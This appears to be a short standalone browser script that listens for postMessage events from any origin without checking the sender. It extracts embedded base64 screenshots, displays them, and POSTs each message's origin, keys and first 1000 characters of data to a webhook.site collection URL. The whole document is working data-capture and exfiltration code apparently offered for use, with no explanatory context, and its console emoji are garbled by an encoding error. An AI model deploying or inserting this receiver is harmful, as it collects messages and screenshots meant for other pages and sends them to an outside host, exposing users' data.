<script>
  function deepFindScreenshot(obj) {
    const str = JSON.stringify(obj);
    const match = str.match(/data:image\/png;base64,[A-Za-z0-9+/=]+/);
    return match ? match[0] : null;
  }

  window.addEventListener("message", (e) => {
    const origin = e.origin;
    const screenshot = deepFindScreenshot(e.data);
    const keys = Object.keys(e.data || {});

    console.log("üì• Message received from", origin);
    console.log("üîë Keys:", keys);
    console.log("üñºÔ∏è Screenshot embedded?", !!screenshot);

    if (screenshot) {
      const img = document.createElement("img");
      img.src = screenshot;
      img.style = "max-width:100%;border:2px solid red;";
      document.body.appendChild(img);
    }

    fetch("https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322", {
      method: "POST",
      mode: "no-cors",
      body: JSON.stringify({
        origin,
        keys,
        containsScreenshot: !!screenshot,
        truncated: JSON.stringify(e.data).slice(0, 1000),
        timestamp: new Date().toISOString()
      })
    });
  });

  console.log("‚úÖ Receiver ready");
</script>
